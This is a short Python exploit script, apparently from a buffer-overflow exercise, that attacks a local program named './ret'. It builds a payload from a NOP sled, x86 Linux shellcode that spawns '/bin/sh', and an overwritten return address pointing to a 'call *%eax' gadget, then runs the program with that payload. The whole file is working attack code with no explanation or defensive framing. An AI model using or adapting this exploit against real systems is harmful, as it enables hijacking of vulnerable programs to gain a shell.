from struct import pack
from os import system

#1008
##########################################
#	NOP +shellcode+NOP+call_eax      #
##########################################

shellcode=("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
	   "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

call_eax=pack("<L",0x08048353) #call *%eax
nop="\x90"
payload=nop*504+shellcode+nop*(504-len(shellcode))+call_eax

system("./ret %s"%payload)
